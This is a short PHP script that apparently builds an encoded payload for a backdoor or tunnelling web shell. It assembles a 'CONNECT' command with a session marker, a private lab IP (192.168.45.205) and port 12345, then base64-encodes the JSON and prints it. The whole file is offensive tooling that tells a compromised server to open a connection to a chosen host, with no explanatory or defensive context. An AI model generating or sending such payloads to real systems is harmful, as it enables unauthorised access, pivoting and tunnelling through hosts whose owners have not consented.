<?php

$payload = [
    2 => "CONNECT", // CMD
    3 => "mark1",  // MARK (unique identifier for session)
    6 => "192.168.45.205", // Target IP (for CONNECT case)
    7 => "12345",      // Port (for CONNECT case)
];
print_r($payload);
$encoded = base64_encode(json_encode($payload));
echo "Payload: " . $encoded . "\n";
?>
